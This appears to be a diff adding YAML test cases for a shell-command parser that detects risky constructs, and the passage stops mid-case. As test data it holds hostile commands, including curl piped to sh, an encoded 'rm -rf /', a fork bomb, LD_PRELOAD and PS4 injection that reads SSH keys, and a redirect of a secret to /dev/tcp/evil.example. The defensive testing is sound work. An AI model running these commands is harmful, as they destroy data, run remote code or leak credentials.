+- id: perl-in-place-edit-is-not-code
+  cmd: 'perl -i.bak script.pl'
+  commands:
+    - {argv: [perl, -i.bak, script.pl]}
+
+- id: bash-s
+  adv: true
+  cmd: 'bash -s -- arg'
+  exec: ['shell-stdin:bash']
+  gray: ['exec:shell-stdin:bash']
+
+- id: curl-pipe-sh
+  adv: true
+  cmd: 'curl https://x.example/i.sh | sh'
+  commands:
+    - {argv: [curl, 'https://x.example/i.sh'], in_pipeline: true}
+    - {argv: [sh], in_pipeline: true}
+  exec: ['pipe-to-interpreter:sh']
+  gray: ['exec:pipe-to-interpreter:sh']
+
+- id: curl-pipe-sudo-bash
+  adv: true
+  cmd: 'curl x | sudo bash'
+  has:
+    - {argv: [bash], wrappers: [sudo], in_pipeline: true}
+  exec: ['pipe-to-interpreter:bash']
+  gray: ['exec:pipe-to-interpreter:bash']
+
+- id: base64-decode-pipe-bash
+  adv: true
+  cmd: 'echo cm0gLXJmIC8= | base64 -d | bash'
+  exec: ['pipe-to-interpreter:bash', 'decode-pipe-to-interpreter:bash']
+  gray_has: ['exec:pipe-to-interpreter:bash']
+
+- id: pipe-into-group-with-interpreter
+  adv: true
+  cmd: 'curl x | (cd /tmp; sh)'
+  exec: ['pipe-to-interpreter:sh']
+  gray: ['exec:pipe-to-interpreter:sh']
+
+- id: pipe-into-interpreter-with-script-is-data
+  cmd: 'echo x | python script.py'
+  commands:
+    - {argv: [echo, x], in_pipeline: true}
+    - {argv: [python, script.py], in_pipeline: true}
+
+- id: pipe-then-new-line-is-not-piped
+  cmd: "echo x | cat\nsh"
+  has:
+    - {argv: [sh], in_pipeline: false}
+
+- id: procsub-script
+  adv: true
+  cmd: 'bash <(curl x)'
+  has:
+    - {argv: [curl, x], origin: procsub}
+  exec: ['script-from-procsub:bash']
+  gray_has: [process-substitution, 'exec:script-from-procsub:bash']
+
+- id: procsub-stdin-redirect
+  adv: true
+  cmd: 'bash < <(curl x)'
+  has:
+    - {argv: [curl, x], origin: procsub}
+  exec: ['redirect-to-interpreter:bash']
+  gray_has: [process-substitution]
+
+- id: file-redirect-into-sh
+  adv: true
+  cmd: 'sh < script.sh'
+  commands:
+    - {argv: [sh], redirects: [['<', null, script.sh]]}
+  exec: ['redirect-to-interpreter:sh']
+  gray: ['exec:redirect-to-interpreter:sh']
+
+- id: python-dash-heredoc
+  adv: true
+  cmd: "python - <<EOF\nimport os\nEOF"
+  commands:
+    - {argv: [python, '-'], redirects: [['<<', null, null]]}
+  exec: ['stdin-to-interpreter:python', 'heredoc-to-interpreter:python']
+  gray_has: ['exec:heredoc-to-interpreter:python']
+
+- id: pwsh-and-cmd
+  adv: true
+  cmd: 'pwsh -c x; cmd /c y'
+  exec: ['interpreter:pwsh', 'interpreter:cmd']
+  gray_has: ['foreign-shell:pwsh', 'foreign-shell:cmd']
+
+- id: fish-c-is-best-effort
+  adv: true
+  cmd: "fish -c 'rm x'"
+  has:
+    - {argv: [rm, x], origin: bash-c}
+  gray: ['foreign-shell:fish']
+
+- id: find-exec
+  adv: true
+  cmd: 'find . -name x -exec rm -rf {} \;'
+  commands:
+    - {argv: [find, ., -name, x, -exec, rm, -rf, '{}', ';'], origin: top}
+    - {argv: [rm, -rf, '{}'], origin: find-exec, args_from_stdin: true}
+  exec: [find-exec]
+  gray: ['exec:find-exec']
+
+- id: find-execdir-plus
+  adv: true
+  cmd: 'find . -execdir rm {} +'
+  has:
+    - {argv: [rm, '{}'], origin: find-exec}
+  exec: [find-exec]
+  gray: ['exec:find-exec']
+
+- id: find-exec-sh-c
+  adv: true
+  cmd: "find . -exec sh -c 'rm {}' \\; -delete"
+  has:
+    - {argv: [sh, -c, 'rm {}'], origin: find-exec}
+    - {argv: [rm, '{}'], origin: bash-c}
+  exec: [find-exec]
+  gray: ['exec:find-exec']
+
+- id: find-ok-unterminated
+  adv: true
+  cmd: 'find . -ok rm'
+  has:
+    - {argv: [rm], origin: find-exec}
+  exec: [find-exec]
+  gray: [find-exec-unterminated, 'exec:find-exec']
+
+- id: find-without-exec
+  cmd: 'find . -name "*.py" -print'
+  commands:
+    - {argv: [find, ., -name, '*.py', -print]}
+
+- id: find-braces-are-not-brace-expansion
+  cmd: 'find . -exec echo {} \;'
+  has:
+    - {argv: [echo, {t: '{}', glob: false}], origin: find-exec}
+  exec: [find-exec]
+  gray: ['exec:find-exec']
+
+- id: command-runner
+  adv: true
+  cmd: 'watch rm x'
+  exec: ['command-runner:watch']
+  gray: ['exec:command-runner:watch']
+
+- id: su-dash-c
+  adv: true
+  cmd: "su -c 'rm x' root"
+  has:
+    - {argv: [rm, x], origin: bash-c}
+  exec: ['command-runner:su']
+  gray: ['exec:command-runner:su']
+
+- id: trap-action-is-code
+  adv: true
+  cmd: "trap 'rm x' EXIT"
+  has:
+    - {argv: [rm, x], origin: trap}
+  gray: [trap]
+
+- id: trap-list-is-harmless
+  cmd: 'trap -l'
+  commands:
+    - {argv: [trap, -l]}
+
+- id: alias
+  cmd: "alias ll='ls -l'"
+  commands:
+    - {argv: [alias, 'll=ls -l']}
+  gray: [alias]
+
+# ---------------------------------------------------------------- here-docs
+- id: heredoc-body-is-data
+  cmd: "cat <<EOF\nrm -rf /\nEOF\nls"
+  commands:
+    - {argv: [cat], redirects: [['<<', null, null]]}
+    - {argv: [ls]}
+
+- id: heredoc-unquoted-expands-substitution
+  adv: true
+  cmd: "cat <<EOF\n$(rm x)\nEOF"
+  has:
+    - {argv: [rm, x], origin: substitution}
+
+- id: heredoc-quoted-delimiter-is-literal
+  adv: true
+  cmd: "cat <<'EOF'\n$(rm x)\nEOF"
+  commands:
+    - {argv: [cat], redirects: [['<<', null, null]]}
+
+- id: heredoc-backslash-delimiter-is-literal
+  adv: true
+  cmd: "cat <<\\EOF\n$(rm x)\nEOF"
+  commands:
+    - {argv: [cat]}
+
+- id: heredoc-escaped-dollar-is-literal
+  adv: true
+  cmd: "cat <<EOF\n\\$(rm x)\nEOF"
+  commands:
+    - {argv: [cat]}
+
+- id: heredoc-dash-tabs
+  adv: true
+  cmd: "cat <<-EOF\n\t$(rm x)\n\tEOF\nls"
+  commands:
+    - {argv: [cat], redirects: [['<<-', null, null]]}
+    - {argv: [rm, x], origin: substitution}
+    - {argv: [ls]}
+
+- id: heredoc-command-continues-on-the-same-line
+  adv: true
+  cmd: "cat <<EOF && rm x\nbody\nEOF"
+  commands:
+    - {argv: [cat]}
+    - {argv: [rm, x]}
+
+- id: heredoc-delimiter-inside-a-line-does-not-end-it
+  adv: true
+  cmd: "cat <<EOF\nxEOF\nEOFx\nEOF\nrm y"
+  commands:
+    - {argv: [cat]}
+    - {argv: [rm, y]}
+
+- id: heredoc-to-bash
+  adv: true
+  cmd: "bash <<EOF\nrm -rf /\nEOF"
+  commands:
+    - {argv: [bash], redirects: [['<<', null, null]]}
+    - {argv: [rm, -rf, /], origin: heredoc}
+  exec: ['heredoc-to-interpreter:bash']
+  gray: ['exec:heredoc-to-interpreter:bash']
+
+- id: heredoc-to-sudo-sh-keeps-wrappers
+  adv: true
+  cmd: "sudo sh <<EOF\nrm x\nEOF"
+  has:
+    - {argv: [rm, x], origin: heredoc, wrappers: [sudo]}
+  exec: ['heredoc-to-interpreter:sh']
+  gray: ['exec:heredoc-to-interpreter:sh']
+
+- id: heredoc-to-bash-with-expansion-is-dynamic
+  adv: true
+  cmd: "bash <<EOF\nrm $x\nEOF"
+  has:
+    - {argv: [rm, {t: $x, expands: true}], origin: heredoc}
+  exec: ['heredoc-to-interpreter:bash']
+  gray_has: ['dynamic-code:heredoc']
+
+- id: herestring-to-bash
+  adv: true
+  cmd: 'bash <<< "rm -rf /"'
+  commands:
+    - {argv: [bash], redirects: [['<<<', null, 'rm -rf /']]}
+    - {argv: [rm, -rf, /], origin: heredoc}
+  exec: ['herestring-to-interpreter:bash']
+  gray: ['exec:herestring-to-interpreter:bash']
+
+- id: heredoc-cat-pipe-bash
+  adv: true
+  cmd: "cat <<EOF | bash\nrm -rf /\nEOF"
+  exec: ['pipe-to-interpreter:bash']
+  gray: ['exec:pipe-to-interpreter:bash']
+
+- id: heredoc-empty-delimiter
+  adv: true
+  cmd: "cat <<''\nbody\n\nrm x"
+  commands:
+    - {argv: [cat]}
+    - {argv: [rm, x]}
+
+- id: heredoc-unterminated
+  adv: true
+  cmd: "cat <<EOF\nfoo"
+  commands:
+    - {argv: [cat]}
+  gray: [unterminated-heredoc]
+
+- id: heredoc-without-newline
+  adv: true
+  cmd: "cat <<EOF"
+  commands:
+    - {argv: [cat]}
+  gray: [unterminated-heredoc]
+
+- id: heredoc-unterminated-bash-still-exposes-body
+  adv: true
+  cmd: "bash <<EOF\nrm x"
+  has:
+    - {argv: [rm, x], origin: heredoc}
+  gray_has: [unterminated-heredoc]
+  exec: ['heredoc-to-interpreter:bash']
+
+# ---------------------------------------------------------------- gray constructs
+- id: if-statement
+  adv: true
+  cmd: 'if true; then rm -rf /; fi'
+  commands:
+    - {argv: ['true']}
+    - {argv: [rm, -rf, /]}
+  gray: [compound:if, compound:then, compound:fi]
+
+- id: while-loop-redirect-is-visible
+  adv: true
+  cmd: 'while read l; do rm "$l"; done < f'
+  commands:
+    - {argv: [read, l]}
+    - {argv: [rm, {t: $l, expands: true}]}
+    - {argv: [], redirects: [['<', null, f]]}
+  gray: [compound:while, compound:do, compound:done]
+
+- id: for-loop-list-substitution
+  adv: true
+  cmd: 'for f in $(rm x) b; do echo $f; done'
+  has:
+    - {argv: [rm, x], origin: substitution}
+    - {argv: [echo, {t: $f, expands: true}]}
+  gray_has: [compound:for]
+
+- id: until-and-select
+  cmd: 'until false; do x; done; select v in a b; do y; done'
+  has:
+    - {argv: [x]}
+    - {argv: [y]}
+  gray_has: [compound:until, compound:select]
+
+- id: case-statement
+  adv: true
+  cmd: 'case x in a) rm;; b|c) ls;; esac'
+  commands:
+    - {argv: [rm]}
+    - {argv: [ls]}
+  gray: [compound:case]
+
+- id: case-subject-substitution
+  adv: true
+  cmd: 'case $(rm x) in a) ;; esac'
+  has:
+    - {argv: [rm, x], origin: substitution}
+  gray: [compound:case]
+
+- id: function-definition
+  adv: true
+  cmd: 'f() { rm -rf /; }; f'
+  commands:
+    - {argv: [rm, -rf, /]}
+    - {argv: [f]}
+  gray: [compound:function]
+
+- id: function-keyword
+  cmd: 'function f { rm x; }'
+  commands:
+    - {argv: [rm, x]}
+  gray: [compound:function]
+
+- id: fork-bomb
+  adv: true
+  cmd: ':(){ :|:& };:'
+  has:
+    - {argv: [':'], in_pipeline: true, background: true}
+  gray: [compound:function]
+
+- id: double-bracket
+  cmd: '[[ -f x && -d y ]]'
+  commands:
+    - {argv: ['[[', -f, x, '&&', -d, y, ']]']}
+  gray: ['compound:[[']
+
+- id: double-bracket-substitution
+  adv: true
+  cmd: '[[ $(rm x) == y ]]'
+  has:
+    - {argv: [rm, x], origin: substitution}
+  gray: ['compound:[[']
+
+- id: negation
+  cmd: '! rm x'
+  commands:
+    - {argv: [rm, x]}
+  gray: [compound:negation]
+
+- id: coproc
+  cmd: 'coproc cat'
+  commands:
+    - {argv: [cat]}
+  gray: [compound:coproc]
+
+- id: brace-expansion-comma
+  adv: true
+  cmd: 'rm {a,b}'
+  commands:
+    - {argv: [rm, {t: '{a,b}', glob: true}]}
+  gray: [brace-expansion]
+
+- id: brace-expansion-range
+  adv: true
+  cmd: 'echo {1..3}'
+  commands:
+    - {argv: [echo, {t: '{1..3}', glob: true}]}
+  gray: [brace-expansion]
+
+- id: brace-expansion-builds-a-program-name
+  adv: true
+  cmd: '{r,x}m -rf /'
+  commands:
+    - {argv: [{t: '{r,x}m', glob: true}, -rf, /]}
+  gray: [brace-expansion, dynamic-command-name]
+
+- id: braces-without-comma-are-literal
+  cmd: 'echo {} {a} ${x}'
+  commands:
+    - {argv: [echo, {t: '{}', glob: false}, {t: '{a}', glob: false}, {t: '${x}', glob: false, expands: true}]}
+
+- id: quoted-braces-are-literal
+  cmd: 'echo "{a,b}"'
+  commands:
+    - {argv: [echo, {t: '{a,b}', glob: false}]}
+
+- id: process-substitution
+  adv: true
+  cmd: 'diff <(ls a) >(cat)'
+  has:
+    - {argv: [ls, a], origin: procsub}
+    - {argv: [cat], origin: procsub}
+  gray: [process-substitution]
+
+- id: extglob
+  adv: true
+  cmd: 'echo @(a|b)'
+  commands:
+    - {argv: [echo, {t: '@(a|b)', glob: true}]}
+  gray: [extglob]
+
+- id: extglob-hides-substitution
+  adv: true
+  cmd: 'echo @($(rm x)|b)'
+  has:
+    - {argv: [rm, x], origin: substitution}
+  gray: [extglob]
+
+# ---------------------------------------------------------------- unterminated and malformed
+- id: unterminated-double-quote
+  adv: true
+  cmd: 'echo "abc'
+  commands:
+    - {argv: [echo, abc]}
+  gray: [unterminated-quote]
+
+- id: unterminated-single-quote
+  adv: true
+  cmd: "echo 'abc"
+  commands:
+    - {argv: [echo, abc]}
+  gray: [unterminated-quote]
+
+- id: unterminated-substitution
+  adv: true
+  cmd: 'echo $(rm x'
+  has:
+    - {argv: [rm, x], origin: substitution}
+  gray: [unterminated-paren]
+
+- id: unterminated-backtick
+  adv: true
+  cmd: 'echo `rm x'
+  has:
+    - {argv: [rm, x], origin: substitution}
+  gray: [unterminated-backtick]
+
+- id: unterminated-subshell
+  adv: true
+  cmd: '( rm x'
+  commands:
+    - {argv: [rm, x], origin: subshell}
+  gray: [unterminated-paren]
+
+- id: unterminated-brace-group
+  adv: true
+  cmd: '{ rm x;'
+  commands:
+    - {argv: [rm, x]}
+  gray: [unterminated-brace]
+
+- id: brace-group-without-semicolon
+  adv: true
+  note: "a closing brace only counts at command start, so this group never closes"
+  cmd: '{ rm x }'
+  commands:
+    - {argv: [rm, x, '}']}
+  gray: [unterminated-brace]
+
+- id: unterminated-parameter-expansion
+  adv: true
+  cmd: 'echo ${x'
+  commands:
+    - {argv: [echo, {t: '${x', expands: true}]}
+  gray: [unterminated-expansion]
+
+- id: dangling-and
+  adv: true
+  cmd: 'echo a &&'
+  commands:
+    - {argv: [echo, a]}
+  gray: [syntax-error]
+
+- id: stray-case-terminator
+  adv: true
+  cmd: 'a;; b'
+  has:
+    - {argv: [a]}
+    - {argv: [b]}
+  gray: [syntax-error]
+
+- id: stray-close-paren
+  adv: true
+  cmd: 'echo a ) rm x'
+  has:
+    - {argv: [rm, x]}
+  gray: [syntax-error]
+
+- id: stray-close-brace
+  adv: true
+  cmd: 'echo a; } rm x'
+  has:
+    - {argv: [echo, a]}
+  gray: [syntax-error]
+
+- id: paren-in-the-middle-of-a-command
+  adv: true
+  cmd: 'echo a b ( c )'
+  commands:
+    - {argv: [echo, a, b]}
+    - {argv: [c], origin: subshell}
+  gray: [syntax-error]
+
+- id: nul-byte
+  adv: true
+  cmd: "echo a\x00b; rm x"
+  has:
+    - {argv: [rm, x]}
+  gray: [nul-byte]
+
+# ---------------------------------------------------------------- limits
+- id: nesting-too-deep
+  adv: true
+  note: 50 nested $( - must stop quickly with gray, not recurse forever
+  gen: {prefix: 'echo ', unit: '$(', times: 50, suffix: 'rm x'}
+  gray_has: [nesting-too-deep]
+  commands: null
+
+- id: deep-subshells
+  adv: true
+  gen: {prefix: '', unit: '(', times: 10000, suffix: 'rm x'}
+  gray_has: [nesting-too-deep]
+  commands: null
+
+- id: deep-quotes-and-substitutions
+  adv: true
+  gen: {prefix: '', unit: '"$(', times: 2000, suffix: ''}
+  gray_has: [nesting-too-deep]
+  commands: null
+
+- id: many-words-within-limit
+  gen: {prefix: 'echo ', unit: 'a ', times: 3000, suffix: ''}
+  commands: null
+
+- id: too-many-words
+  adv: true
+  gen: {prefix: 'rm ', unit: 'a ', times: 5000, suffix: ''}
+  gray: [too-many-words]
+  commands: null
+
+- id: very-long-input
+  adv: true
+  note: only the first 1 MiB is parsed; a rm at the front stays visible
+  gen: {prefix: 'rm -rf / ; ', unit: 'a;', times: 600000, suffix: ''}
+  has:
+    - {argv: [rm, -rf, /]}
+  gray_has: [too-long]
+  commands: null
+
+- id: megabyte-of-statements
+  adv: true
+  gen: {prefix: '', unit: 'a;', times: 524288, suffix: ''}
+  gray: [too-many-words]
+  commands: null
+
+# ---------------------------------------------------------------- review fixes: wrappers that were not peeled
+- id: wsl-runs-the-rest-through-a-shell
+  adv: true
+  note: without -e the rest is a command line for the Linux shell, so it is parsed again; the wrapper is peeled
+  cmd: 'wsl rm -rf ~'
+  has:
+    - {argv: [rm, -rf, '~'], wrappers: [wsl]}
+  gray: ['exec:wrapper-shell:wsl']
+  exec: ['wrapper-shell:wsl']
+
+- id: wsl-exe-e-execs-directly
+  adv: true
+  cmd: 'wsl.exe -e rm -rf ~'
+  commands:
+    - {argv: [rm, -rf, '~'], wrappers: [wsl]}
+
+- id: wsl-distribution-and-user
+  adv: true
+  cmd: 'wsl -d Ubuntu -u root --exec rm x'
+  commands:
+    - {argv: [rm, x], wrappers: [wsl]}
+
+- id: wsl-shell-string-is-reparsed
+  adv: true
+  cmd: 'wsl "ls; rm -rf ~"'
+  has:
+    - {argv: [rm, -rf, '~']}
+  gray: ['exec:wrapper-shell:wsl']
+  exec: ['wrapper-shell:wsl']
+
+- id: wsl-cd-is-gray
+  adv: true
+  note: --cd changes the working directory, so relative paths mean something else
+  cmd: 'wsl --cd /tmp -e rm x'
+  commands:
+    - {argv: [rm, x], wrappers: [wsl]}
+  gray: ['wrapper-option:wsl:--cd']
+
+- id: wsl-management-command-is-not-stripped
+  cmd: 'wsl --shutdown'
+  commands:
+    - {argv: [wsl, --shutdown]}
+  gray: ['wrapper-options:wsl']
+
+- id: sshpass-peeled
+  adv: true
+  cmd: 'sshpass -p secret ssh host'
+  commands:
+    - {argv: [ssh, host], wrappers: [sshpass]}
+
+- id: sshpass-password-file-is-gray
+  adv: true
+  cmd: 'sshpass -f ~/.pw ssh host'
+  commands:
+    - {argv: [ssh, host], wrappers: [sshpass]}
+  gray: ['wrapper-option:sshpass:-f']
+
+- id: sshpass-then-sudo-chain
+  adv: true
+  cmd: 'sshpass -e sudo rm -rf /x'
+  commands:
+    - {argv: [rm, -rf, /x], wrappers: [sshpass, sudo]}
+
+- id: gosu-peeled
+  adv: true
+  cmd: 'gosu root rm -rf /x'
+  commands:
+    - {argv: [rm, -rf, /x], wrappers: [gosu]}
+
+- id: gosu-user-and-group
+  cmd: 'gosu app:app rm x'
+  commands:
+    - {argv: [rm, x], wrappers: [gosu]}
+
+- id: su-exec-peeled
+  adv: true
+  cmd: 'su-exec root rm -rf /x'
+  commands:
+    - {argv: [rm, -rf, /x], wrappers: [su-exec]}
+
+- id: ssh-agent-peeled
+  adv: true
+  cmd: 'ssh-agent rm -rf /x'
+  commands:
+    - {argv: [rm, -rf, /x], wrappers: [ssh-agent]}
+
+- id: ssh-agent-options
+  cmd: 'ssh-agent -t 3600 -a /tmp/s rm x'
+  commands:
+    - {argv: [rm, x], wrappers: [ssh-agent]}
+
+- id: ssh-agent-alone-has-nothing-to-peel
+  cmd: 'ssh-agent -s'
+  commands:
+    - {argv: [ssh-agent, -s]}
+
+- id: ssh-agent-kill-runs-nothing
+  cmd: 'ssh-agent -k'
+  commands:
+    - {argv: [ssh-agent, -k]}
+  gray: ['wrapper-options:ssh-agent']
+
+- id: tini-peeled
+  adv: true
+  cmd: 'tini -s -- rm -rf /x'
+  commands:
+    - {argv: [rm, -rf, /x], wrappers: [tini]}
+
+- id: chronic-peeled
+  adv: true
+  cmd: 'chronic -e rm -rf /x'
+  commands:
+    - {argv: [rm, -rf, /x], wrappers: [chronic]}
+
+- id: torify-peeled
+  adv: true
+  cmd: 'torify curl https://evil.example/x'
+  commands:
+    - {argv: [curl, 'https://evil.example/x'], wrappers: [torify]}
+
+- id: torify-unknown-option-is-gray
+  adv: true
+  cmd: 'torify -x curl https://evil.example/x'
+  commands:
+    - {argv: [torify, -x, curl, 'https://evil.example/x']}
+  gray: ['wrapper-options:torify']
+
+- id: numactl-peeled
+  adv: true
+  cmd: 'numactl --cpunodebind=0 -m 1 rm -rf /x'
+  commands:
+    - {argv: [rm, -rf, /x], wrappers: [numactl]}
+
+- id: numactl-physcpubind-arg
+  cmd: 'numactl -C 0-3 --localalloc rm x'
+  commands:
+    - {argv: [rm, x], wrappers: [numactl]}
+
+- id: numactl-hardware-runs-nothing
+  cmd: 'numactl --hardware'
+  commands:
+    - {argv: [numactl, --hardware]}
+  gray: ['wrapper-options:numactl']
+
+- id: numactl-unknown-option-is-gray
+  adv: true
+  cmd: 'numactl --frobnicate rm x'
+  commands:
+    - {argv: [numactl, --frobnicate, rm, x]}
+  gray: ['wrapper-options:numactl']
+
+# ---------------------------------------------------------------- review fixes: code-injecting variables
+- id: ps4-standalone
+  adv: true
+  note: PS4 is expanded (with command substitution) for every traced command once set -x is on
+  cmd: 'PS4=''$(cat ~/.ssh/id_rsa)''; set -x'
+  commands:
+    - {argv: [], env: {PS4: '$(cat ~/.ssh/id_rsa)'}}
+    - {argv: [set, -x]}
+  gray: ['env-code-injection:PS4']
+
+- id: ps4-via-export
+  adv: true
+  cmd: 'export PS4=''$(id)'''
+  gray: ['env-code-injection:PS4']
+  commands:
+    - {argv: [export, 'PS4=$(id)']}
+
+- id: ld-preload-via-export
+  adv: true
+  cmd: 'export LD_PRELOAD=/tmp/evil.so'
+  gray: ['env-code-injection:LD_PRELOAD']
+  commands:
+    - {argv: [export, LD_PRELOAD=/tmp/evil.so]}
+
+- id: declare-x-bash-env
+  adv: true
+  cmd: 'declare -x BASH_ENV=/tmp/evil.sh'
+  gray: ['env-code-injection:BASH_ENV']
+  commands:
+    - {argv: [declare, -x, BASH_ENV=/tmp/evil.sh]}
+
+- id: bash-func-export
+  adv: true
+  note: an exported function (BASH_FUNC_name%%) is defined in every child bash
+  cmd: 'export "BASH_FUNC_ls%%=() { id; }"'
+  gray_has: ['env-code-injection:BASH_FUNC_ls%%']
+  commands: null
+
+- id: env-prefix-code-injection
+  adv: true
+  cmd: 'GIT_SSH_COMMAND=''sh -c id'' git fetch'
+  gray: ['env-code-injection:GIT_SSH_COMMAND']
+  commands:
+    - {argv: [git, fetch], env: {GIT_SSH_COMMAND: sh -c id}}
+
+- id: env-wrapper-code-injection
+  adv: true
+  cmd: 'env NODE_OPTIONS=--require=/tmp/x node a.js'
+  gray: ['env-code-injection:NODE_OPTIONS']
+  commands:
+    - {argv: [node, a.js], wrappers: [env], env: {NODE_OPTIONS: '--require=/tmp/x'}}
+
+- id: standalone-lessopen
+  adv: true
+  cmd: 'LESSOPEN=''|id'''
+  gray: ['env-code-injection:LESSOPEN']
+  commands:
+    - {argv: [], env: {LESSOPEN: '|id'}}
+
+- id: standalone-prompt-command
+  adv: true
+  cmd: 'PROMPT_COMMAND=''id'''
+  gray: ['env-code-injection:PROMPT_COMMAND']
+  commands:
+    - {argv: [], env: {PROMPT_COMMAND: id}}
+
+- id: local-pythonstartup
+  adv: true
+  cmd: 'local PYTHONSTARTUP=/tmp/x.py'
+  gray: ['env-code-injection:PYTHONSTARTUP']
+  commands:
+    - {argv: [local, PYTHONSTARTUP=/tmp/x.py]}
+
+- id: export-bare-name-of-a-code-variable
+  adv: true
+  cmd: 'export RUBYOPT'
+  gray: ['env-code-injection:RUBYOPT']
+  commands:
+    - {argv: [export, RUBYOPT]}
+
+- id: ordinary-assignments-are-not-gray
+  cmd: 'FOO=1 BAR=2 ls; export BAZ=3; declare -x QUX=4; local x=y'
+  commands:
+    - {argv: [ls], env: {FOO: '1', BAR: '2'}}
+    - {argv: [export, BAZ=3]}
+    - {argv: [declare, -x, QUX=4]}
+    - {argv: [local, x=y]}
+
+- id: echoing-a-code-variable-name-is-not-an-assignment
+  cmd: 'echo LD_PRELOAD=/x PS4=y'
+  commands:
+    - {argv: [echo, LD_PRELOAD=/x, PS4=y]}
+
+# ---------------------------------------------------------------- review fixes: HOME / PWD / CDPATH
+- id: home-prefix
+  adv: true
+  cmd: 'HOME=/tmp/evil cat ~/.ssh/id_rsa'
+  gray: [home-reassigned]
+  commands:
+    - {argv: [cat, '~/.ssh/id_rsa'], env: {HOME: /tmp/evil}}
+
+- id: home-standalone
+  adv: true
+  cmd: 'HOME=/tmp/evil; cat ~/.ssh/id_rsa'
+  gray: [home-reassigned]
+  commands:
+    - {argv: [], env: {HOME: /tmp/evil}}
+    - {argv: [cat, '~/.ssh/id_rsa']}
+
+- id: home-export
+  adv: true
+  cmd: 'export HOME=/tmp/evil'
+  gray: [home-reassigned]
+  commands:
+    - {argv: [export, HOME=/tmp/evil]}
+
+- id: home-env-wrapper
+  adv: true
+  cmd: 'env HOME=/tmp/evil cat ~/x'
+  gray: [home-reassigned]
+  commands:
+    - {argv: [cat, '~/x'], wrappers: [env], env: {HOME: /tmp/evil}}
+
+- id: pwd-and-oldpwd
+  adv: true
+  cmd: 'PWD=/etc ls; OLDPWD=/etc; cd -'
+  gray: [home-reassigned]
+  commands: null
+
+- id: home-case-insensitive
+  adv: true
+  note: Windows environment variables are case-insensitive
+  cmd: 'home=/tmp/evil ls'
+  gray: [home-reassigned]
+  commands: null
+
+- id: home-by-unset-read-printf
+  adv: true
+  cmd: 'unset HOME; read HOME; printf -v HOME x'
+  gray: [home-reassigned]
+  commands: null
+
+- id: cdpath-assigned
+  adv: true
+  cmd: 'CDPATH=/etc:/root; cd ssh'
+  gray: [cdpath-set]
+  commands: null
+
+- id: cdpath-export-and-prefix
+  adv: true
+  cmd: 'export CDPATH=/x; CDPATH=/y cd z'
+  gray: [cdpath-set]
+  commands: null
+
+- id: home-lookalikes-are-not-home
+  cmd: 'HOMEDIR=/x ls; echo HOME=/x; cd ~'
+  commands: null
+
+# ---------------------------------------------------------------- review fixes: arithmetic / subscript injection
+- id: let-evaluates-a-subscript
+  adv: true
+  note: let evaluates its operand as arithmetic; a[$(cmd)] in a variable value runs cmd
+  cmd: 'x=''a[$(touch /tmp/pwn)]''; let y=x'
+  commands:
+    - {argv: [], env: {x: 'a[$(touch /tmp/pwn)]'}}
+    - {argv: [let, y=x]}
+  gray: ['dynamic-code:subscript']
+
+- id: declare-i-evaluates-assignments
+  adv: true
+  cmd: 'declare -i y; y=''a[$(id)]'''
+  gray: ['dynamic-code:subscript']
+  commands: null
+
+- id: unset-evaluates-a-subscript
+  adv: true
+  cmd: 'unset ''a[$(id)]'''
+  gray: ['dynamic-code:subscript']
+  commands:
+    - {argv: [unset, 'a[$(id)]']}
+
+- id: printf-v-evaluates-a-subscript
+  adv: true
+  cmd: 'printf -v ''a[$(id)]'' x'
+  gray: ['dynamic-code:subscript']
+  commands: null
+
+- id: test-v-evaluates-a-subscript
+  adv: true
+  cmd: '[ -v ''a[$(id)]'' ]'
+  gray: ['dynamic-code:subscript']
+  commands: null
+
+- id: read-evaluates-a-subscript
+  adv: true
+  cmd: 'read ''a[`id`]'''
+  gray: ['dynamic-code:subscript']
+  commands: null
+
+- id: braced-subscript-expands-the-value
+  adv: true
+  cmd: 'x=''a[$(id)]''; echo ${arr[$x]}'
+  gray: ['dynamic-code:subscript']
+  commands: null
+
+- id: braced-offset-is-arithmetic
+  adv: true
+  cmd: 'x=''a[$(id)]''; echo ${y:$x}'
+  gray: ['dynamic-code:subscript']
+  commands: null
+
+- id: escaped-dollar-in-double-quotes-stays-literal
+  adv: true
+  cmd: 'x="a[\$(id)]"; let y=x'
+  gray: ['dynamic-code:subscript']
+  commands: null
+
+- id: backslash-escaped-backtick-stays-literal
+  adv: true
+  cmd: 'x=a\`id\`; let y=x'
+  gray: ['dynamic-code:subscript']
+  commands: null
+
+- id: ansi-c-quoted-substitution-stays-literal
+  adv: true
+  cmd: 'x=$''a[$(id)]''; let y=x'
+  gray: ['dynamic-code:subscript']
+  commands: null
+
+- id: arithmetic-command-with-literal-substitution
+  adv: true
+  cmd: 'x=''a[$(id)]''; (( y = x ))'
+  gray_has: ['dynamic-code:subscript', arithmetic]
+  commands: null
+
+- id: real-substitution-is-listed-not-subscript-gray
+  adv: true
+  note: inside double quotes the substitution really runs here, and is listed as a command
+  cmd: 'unset "a[$(id)]"'
+  commands:
+    - {argv: [id], origin: substitution}
+    - {argv: [unset, 'a[$(id)]']}
+
+- id: literal-substitution-without-a-sink-is-fine
+  cmd: 'echo ''$(id)'''
+  commands:
+    - {argv: [echo, '$(id)']}
+
+- id: let-without-a-literal-substitution-is-fine
+  cmd: 'let y=1+2; declare -i z; unset w'
+  commands: null
+
+# ---------------------------------------------------------------- review fixes: builtins that run code
+- id: mapfile-callback-runs-a-command
+  adv: true
+  cmd: 'mapfile -C ''rm -rf /x'' -c 1 arr < f'
+  gray: ['exec:mapfile-callback']
+  exec: [mapfile-callback]
+  commands: null
+
+- id: readarray-callback-attached
+  adv: true
+  cmd: 'readarray -tCcb arr < f'
+  gray: ['exec:mapfile-callback']
+  exec: [mapfile-callback]
+  commands: null
+
+- id: mapfile-without-callback-is-fine
+  cmd: 'mapfile -t arr < f'
+  commands:
+    - {argv: [mapfile, -t, arr], redirects: [['<', null, f]]}
+
+- id: enable-f-loads-a-shared-object
+  adv: true
+  cmd: 'enable -f /tmp/evil.so evil'
+  gray: ['exec:enable-f']
+  exec: [enable-f]
+  commands:
+    - {argv: [enable, -f, /tmp/evil.so, evil]}
+
+- id: enable-without-f-is-fine
+  cmd: 'enable -n test'
+  commands:
+    - {argv: [enable, -n, test]}
+
+# ---------------------------------------------------------------- review fixes: /dev/tcp with no command
+- id: group-redirect-to-dev-tcp
+  adv: true
+  note: a redirect-only command carrying a /dev/tcp target is emitted as `exec` so the program layer sees the network
+  cmd: '{ cat secret; } > /dev/tcp/evil.example/80'
+  commands:
+    - {argv: [cat, secret]}
+    - {argv: [exec], redirects: [['>', null, /dev/tcp/evil.example/80]]}
+
+- id: bare-redirect-to-dev-udp
+  adv: true
